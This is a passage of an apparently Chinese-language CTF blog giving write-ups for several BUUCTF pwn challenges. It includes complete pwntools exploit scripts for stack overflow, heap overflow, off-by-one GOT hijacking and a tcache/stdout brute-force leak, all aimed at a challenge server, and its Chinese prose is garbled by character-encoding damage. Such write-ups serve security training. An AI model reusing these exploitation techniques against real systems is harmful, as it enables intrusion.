class="hljs-number">0x8534</span>-<span class="hljs-number">0x83D0</span>) + <span class="hljs-string">&quot;c%7$hn&quot;</span><br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">&quot;name?&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>



<h2 id="åã€cmcc-pwnme2"><a href="#åã€cmcc-pwnme2" class="headerlink" title="åã€cmcc_pwnme2"></a>åã€cmcc_pwnme2</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210827143550209.png" alt="image-20210827143550209"></p>
<p>å¸¸è§„checksecï¼Œ32ä½ï¼Œå¼€å¯NX</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210827145058312.png" alt="image-20210827145058312"></p>
<p>è¿›å…¥IDAï¼Œç¨‹åºå­˜åœ¨æ˜æ˜¾æº¢å‡ºï¼Œç„¶åå­˜åœ¨è¿™ä¸ªåé—¨å‡½æ•°å¯ä»¥æ‰“å°flagï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åªéœ€è¦è®©stringé‡Œé¢æ”¾ç€çš„æ˜¯flagå³å¯è·³è½¬åˆ°è¿™è·å¾—flagã€‚</p>
<p>æ‰€ä»¥å…ˆæº¢å‡ºåˆ°è¿”å›åœ°å€ï¼Œåœ¨è¿”å›åœ°å€å¡«ä¸Šè¾“å…¥å‡½æ•°getsï¼Œå¾€stringé‡Œé¢å†™å…¥flag</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210827145907550.png" alt="image-20210827145907550"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26117</span>)<br><span class="hljs-comment">#p = process(&#x27;./1&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwnme2&#x27;</span>)<br>string = <span class="hljs-number">0x0804A060</span><br>gets = elf.plt[<span class="hljs-string">&#x27;gets&#x27;</span>]<br><br><br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span> + p32(gets) + p32(<span class="hljs-number">0x080485CB</span>) + p32(string)<br>p.recvuntil(<span class="hljs-string">&quot;input:&quot;</span>)<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">&quot;./flag&quot;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>



<h2 id="åä¸€ã€hitcontraining-magicheap"><a href="#åä¸€ã€hitcontraining-magicheap" class="headerlink" title="åä¸€ã€hitcontraining_magicheap"></a>åä¸€ã€hitcontraining_magicheap</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210827153019146.png" alt="image-20210827153019146"></p>
<p>å¸¸è§„checksecï¼Œ64ä½ï¼Œæ ¹æ®é¢˜ç›®æ˜¯é“å †é¢˜ï¼Œå¼€äº†NXã€Canary</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210827153850520.png" alt="image-20210827153850520"></p>
<p>è¿›å…¥IDAï¼Œå‘ç°ç»™äº†ä¸ªåé—¨å‡½æ•°ï¼Œå¥½ä¸œè¥¿</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210827155315034.png" alt="image-20210827155315034"></p>
<p>è¿™è¾¹å¦‚æœmagic &gt;4869å°±å¯ä»¥æ‰§è¡Œåˆ°åé—¨å‡½æ•°</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210827155753245.png" alt="image-20210827155753245"></p>
<p>æ¼æ´ç‚¹å¯ä»¥è¯´æ˜¯ååˆ†æ˜æ˜¾äº†ï¼Œè¿™è¾¹editå‡½æ•°é‡Œé¢è¾“å…¥çš„é•¿åº¦éƒ½æ²¡æœ‰æ£€æŸ¥çš„</p>
<p>æ€è·¯ï¼šé€šè¿‡å †æº¢å‡ºï¼Œè¦†ç›–åé¢å †å—ï¼ŒæŠŠå †å—ç”³è¯·åˆ°magicå‰é¢ï¼ŒæŠŠmagicçš„å€¼ä¿®æ”¹æˆå¤§äº4869</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210827161445791.png" alt="image-20210827161445791"></p>
<p>æˆåŠŸgetshell</p>
<p>expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./magicheap&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29052</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Size of Heap :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Content of heap:&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>	p.recvuntil(<span class="hljs-string">&quot;Content of heap : &quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>shell = <span class="hljs-number">0x0000000000400C50</span><br>magic = <span class="hljs-number">0x00000000006020A0</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;cccc&#x27;</span>) <span class="hljs-comment">#2</span><br>free(<span class="hljs-number">1</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span> + p64(<span class="hljs-number">0x70</span>) + p64(magic-<span class="hljs-number">0x20</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">0</span>,payload)<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">0x60</span>,p64(<span class="hljs-number">4870</span>))<br>add(<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">4870</span>))<br><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;4869&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="åäºŒã€hitcontraining-heapcreator"><a href="#åäºŒã€hitcontraining-heapcreator" class="headerlink" title="åäºŒã€hitcontraining_heapcreator"></a>åäºŒã€hitcontraining_heapcreator</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210829092850758.png" alt="image-20210829092850758"></p>
<p>å¸¸è§„checksecï¼Œå¼€äº†NXã€Cannary</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210829094339915.png" alt="image-20210829094339915"></p>
<p>è¿›å…¥IDAï¼Œé˜…è¯»å®Œä»£ç åï¼Œåœ¨editå‡½æ•°ä¸­ï¼Œå­˜åœ¨æ˜æ˜¾çš„æº¢å‡ºä¸€ä¸ªå­—èŠ‚çš„æ¼æ´ï¼ˆoffbyoneï¼‰</p>
<p>å› ä¸ºæœ‰offbyoneæ¼æ´åœ¨ï¼Œé‚£è‚¯å®šæ˜¯æœç€å»ä¿®æ”¹å †å¤´çš„å¤§å°å»çš„ï¼Œæœ€ç»ˆè¾¾æˆoverlap</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210829104050093.png" alt="image-20210829104050093"></p>
<p>å…ˆç”³è¯·å‡ºè¿™äº›å †å—ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªæ˜¯è¦ç”³è¯·0x18çš„ï¼Œå› ä¸ºè¿™æ ·æ‰èƒ½è¦†ç›–åˆ°ä¸‹ä¸€ä¸ªå †å—çš„sizeä½ã€‚ç„¶åå› ä¸ºRELROå’ŒPIEçš„ç¼˜æ•…ï¼Œæˆ‘é€‰æ‹©åŠ«æŒgotè¡¨çš„æ–¹æ³•ï¼Œæ‰€ä»¥ç¬¬å››ä¸ªå †å—å†…å®¹å°±æ˜¯å†™ç€/bin/sh\x00çš„ã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥æŠŠ/bin/sh\x00å†™åˆ°ç¬¬0ä¸ªå †å—ä¸Š</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210829104713815.png" alt="image-20210829104713815"></p>
<p>æ­¤æ—¶åªè¦å†æŠŠè¿™ä¸ªé‡Šæ”¾äº†ï¼Œç„¶åå†ç”³è¯·åŒæ ·å¤§å°çš„å †å—å›æ¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ“æ§å…¶ä¸­æœ¬æ¥æ˜¯ç¬¬äºŒå †å—çš„å†…å®¹</p>
<p>ç„¶åæŠŠå¯ä»¥æ“æ§çš„å †ç»“æ„å†…å®¹ä¿®æ”¹ä¸ºfreeçš„gotè¡¨åœ°å€ï¼Œä»è€Œå¯ä»¥åˆ©ç”¨showå‡½æ•°æ‰“å°å‡ºlibcåœ°å€ã€‚æœ€åå†å†™å…¥syså³å¯getshell</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210829110519523.png" alt="image-20210829110519523"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./heapcreator&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26372</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Content of heap:&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;Content of heap : &quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>free_got = elf.got[<span class="hljs-string">&quot;free&quot;</span>]<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;b&#x27;</span>) <br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;c&#x27;</span>) <br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>) <br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">&#x27;\x81&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span> + p64(<span class="hljs-number">0x8</span>) + p64(free_got))<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Content : &quot;</span>)<br>free = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-built_in">hex</span>(free))<br>libc=LibcSearcher(<span class="hljs-string">&quot;free&quot;</span>,free)<br>sys=libc.dump(<span class="hljs-string">&quot;system&quot;</span>)+free-libc.dump(<span class="hljs-string">&quot;free&quot;</span>)<br>edit(<span class="hljs-number">2</span>,p64(sys))<br>free(<span class="hljs-number">3</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="åä¸‰ã€sctf-2019-one-heap"><a href="#åä¸‰ã€sctf-2019-one-heap" class="headerlink" title="åä¸‰ã€sctf_2019_one_heap"></a>åä¸‰ã€sctf_2019_one_heap</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210830160009616.png" alt="image-20210830160009616"></p>
<p>checksecä¸€ä¸‹ï¼Œ64ä½ï¼Œä¿æŠ¤å…¨å¼€</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830163315917.png" alt="image-20210830163315917"></p>
<p>è¿›å…¥IDAï¼Œå †çš„èœå•åªæœ‰ä¸¤ç§åŠŸèƒ½ï¼Œç”³è¯·å’Œé‡Šæ”¾</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830163404930.png" alt="image-20210830163404930"></p>
<p>ç”³è¯·çš„å †å—ä¸èƒ½å¤§äº0x7fï¼Œå¹¶ä¸”ç”³è¯·å’Œé‡Šæ”¾éƒ½æœ‰æ¬¡æ•°é™åˆ¶ï¼ˆå…¶ä¸­èƒ½ç”³è¯·0xfæ¬¡ï¼Œé‡Šæ”¾4æ¬¡ï¼‰ã€‚è€Œä¸”ï¼Œå †å—æˆ‘ä»¬åªèƒ½è®¿é—®åˆ°å½“å‰ç”³è¯·å‡ºçš„å †å—</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830163542538.png" alt="image-20210830163542538"></p>
<p>é‡Šæ”¾å †å—æ—¶ï¼ŒæŒ‡é’ˆæ²¡æœ‰ç½®0</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830185924091.png" alt="image-20210830185924091"></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830200649131-1630325227529.png" alt="image-20210830200649131"></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830201741615.png" alt="image-20210830201741615"></p>
<p>è¿ç»­é‡Šæ”¾ä¸¤æ¬¡å¤§å°ä¸º0x70çš„å †å—ï¼Œè¿›å…¥åˆ°tcache bin ä¸­ï¼Œç„¶åæ ¹æ®ä¸€ä¸ªå­—èŠ‚æœªçŸ¥è¿›è¡Œçˆ†ç ´ï¼Œä½¿å¾—å †å—åˆ†é…tcache_perthread_structï¼ˆå°±æ˜¯å¼€å¤´0x250çš„é‚£ä¸ªå †å—ï¼‰ä¸Š</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830203528418.png" alt="image-20210830203528418"></p>
<p>æŠŠæ•°å€¼æ”¹ä¸º7ï¼Œç„¶åå†æŠŠè¿™ä¸ªå †å—é‡Šæ”¾ï¼Œå°†ä¼šè¿›å…¥åˆ°unsorted binä¸­</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830210232915.png" alt="image-20210830210232915"></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830210216419.png" alt="image-20210830210216419"></p>
<p>fdï¼Œbkå·²ç»æŒ‡å‘äº†libcä¸­æŸä¸ªåœ°å€äº†ï¼Œæ‰€ä»¥åé¢è¿˜æ˜¯çˆ†ç ´ä¸€ä¸ªå­—èŠ‚ï¼Œå»è®©stdoutåå‡ºlibcåœ°å€ã€‚ç„¶åå› ä¸ºtcacheç»“æ„è¢«æ”¹åŠ¨å¾ˆå¤§ï¼Œè¦å…ˆä¿®å¤ä¸€ä¸‹</p>
<p>åé¢å…¶å®å°±æ²¡æœ‰ä»€ä¹ˆäº†ï¼Œå°±æ˜¯ç”³è¯·å‡ºå †å—ï¼Œå› ä¸ºæˆ‘ä»¬æŠŠtcache_perthread_structé‡Šæ”¾äº†ï¼Œæ‰€ä»¥ç”³è¯·å‡ºçš„å †å—éƒ½åœ¨ä¸Šé¢ï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡è¿™ä¸ªæ¥å¡«å†™å‡ºç›®æ ‡åœ°å€ï¼Œç„¶åå°±ä¼šè¿›å…¥åˆ°tcache binä¸­ï¼Œæ¥ç€å†ç”³è¯·å°±èƒ½ä»»æ„åœ°å€å†™ã€‚è¿™è¾¹è¿˜è¦æ³¨æ„çš„å°±æ˜¯è¿˜è¦ç”¨reallocè°ƒæ•´ä¸€ä¸‹rsp</p>
<p>ç„¶åè¿™è¾¹è¯´ä¸‹ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯è¿æ°”é—®é¢˜ï¼Œçˆ†ç ´ä¸Šåƒæ¬¡éƒ½æ²¡æ‰“é€š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./sctf_2019_one_heap&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,28247)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Input the size:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Input the content:&quot;</span>)<br>	p.sendline(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rsp &amp; 0xf == 0</span><br><span class="hljs-string">  rcx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x40] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">first,second</span>):</span><br>	add(<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>	free()<br>	free()<br>	add(<span class="hljs-number">0x70</span>,p16((first &lt;&lt; <span class="hljs-number">8</span>) | <span class="hljs-number">0x10</span>))<br>	add(<span class="hljs-number">0x70</span>,p8(<span class="hljs-number">0x10</span>))<br>	add(<span class="hljs-number">0x70</span>,p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0x07000000</span>))<br>	free()<br>	add(<span class="hljs-number">0x40</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span>)<br>	add(<span class="hljs-number">0x10</span>,p64(<span class="hljs-number">0</span>) + p16((second &lt;&lt; <span class="hljs-number">8</span>) | <span class="hljs-number">0x60</span>))<br>	add(<span class="hljs-number">0x40</span>,p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>	p.recv(<span class="hljs-number">8</span>)<br>	leak_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>	log.success(<span class="hljs-string">&quot;leak_addr==&gt;0x%x&quot;</span> %leak_addr)<br>	libc_base = leak_addr - <span class="hljs-number">0x3ed8b0</span><br>	ogg = libc_base + <span class="hljs-number">0x10a38c</span><br>	realloc_hook = libc_base + libc.sym[<span class="hljs-string">&quot;__realloc_hook&quot;</span>]<br>	realloc = libc_base + libc.sym[<span class="hljs-string">&quot;realloc&quot;</span>]<br>	log.success(<span class="hljs-string">&quot;realloc==&gt;0x%x&quot;</span> %realloc)<br>	log.success(<span class="hljs-string">&quot;one_gadget==&gt;0x%x&quot;</span> %ogg)<br>	add(<span class="hljs-number">0x10</span>,p64(<span class="hljs-number">0</span>) + p64(realloc_hook))<br>	add(<span class="hljs-number">0x40</span>,p64(ogg) + p64(realloc + <span class="hljs-number">0x4</span>))<br>	add(<span class="hljs-number">0x10</span>)<br><br>	<span class="hljs-keyword">try</span>:<br>		p.sendline(<span class="hljs-string">&quot;id&quot;</span>)<br>		p.recvline_contains(<span class="hljs-string">&quot;uid&quot;</span>, timeout=<span class="hljs-number">2</span>)<br>		p.sendline(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>		p.interactive()<br>	<span class="hljs-keyword">except</span>:<br>		<span class="hljs-keyword">try</span>:<br>			p.close()<br>		<span class="hljs-keyword">except</span>:<br>			<span class="hljs-keyword">pass</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>	n = <span class="hljs-number">0x1000</span><br>	<span class="hljs-keyword">while</span> n &gt; <span class="hljs-number">0</span>:<br>		log.success(<span class="hljs-string">&quot;counts: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0x1000</span> - n))<br>		<span class="hljs-keyword">try</span>:<br>			pwn(<span class="hljs-number">0x60</span>,<span class="hljs-number">0x67</span>)<br>		<span class="hljs-keyword">except</span>:<br>			<span class="hljs-keyword">pass</span><br>		<span class="hljs-comment">#p = process(argv=[ld.path,elf.path],env=&#123;&quot;LD_PRELOAD&quot; : libc.path&#125;)</span><br>		p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28247</span>)<br>		n -= <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>







<h2 id="åå››ã€warmup"><a href="#åå››ã€warmup" class="headerlink" title="åå››ã€warmup"></a>åå››ã€warmup</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210831104431370.png" alt="image-20210831104431370"></p>
<p>å¸¸è§„checksecä¸€ä¸‹ï¼Œ32ä½ï¼Œåªå¼€äº†NX</p>
<p>è¿›å…¥IDAï¼Œå‘ç°å‡½æ•°å¾ˆå°‘ï¼Œè€Œä¸”éƒ½æ˜¯è°ƒç”¨ç³»ç»Ÿè°ƒç”¨å·æ‰§è¡Œå‡½æ•°çš„ã€‚æ‰€ä»¥è‚¯å®šæ˜¯è¦æ‰§è¡Œåˆ°0xBçš„execveå‡½æ•°æ¥getshell</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210831104803643.png" alt="image-20210831104803643"></p>
<p>é¦–å…ˆï¼Œè¦å…ˆåˆ¶é€ å‡º/bin/sh\x00æ‰è¡Œï¼Œæ‰€ä»¥å…ˆè·³è½¬åˆ°readä¸Šå»ï¼Œå¾€.bssæ®µä¸Šå†™/bin/sh\x00ã€‚ä»”ç»†çœ‹ï¼Œè¿™è¾¹ä¼ é€’çš„readçš„å‚æ•°ï¼Œéƒ½æ˜¯æ¥è‡ªäºæ ˆä¸Šçš„ï¼Œè€Œä¸”éƒ½æ˜¯espå‰é¢çš„åœ°å€å­˜çš„å€¼ï¼Œæ‰€ä»¥å…¶å®æˆ‘ä»¬å°±æ˜¯æŒ‰ç…§å¹³å¸¸çš„å†™æ³•ï¼Œè¿”å›åœ°å€è¦†ç›–ä¸ºè¿™é‡Œçš„åœ°å€ï¼Œç„¶åå†å†™ä¸€ä¸ªæ–°çš„è¿”å›åœ°å€ï¼Œåé¢è·Ÿä¸Šreadçš„ä¸‰ä¸ªå‚æ•°<code>payload = &#39;a&#39;*0x20+p32(read)+p32(start)+p32(0)+p32(bss)+p32(8)</code></p>
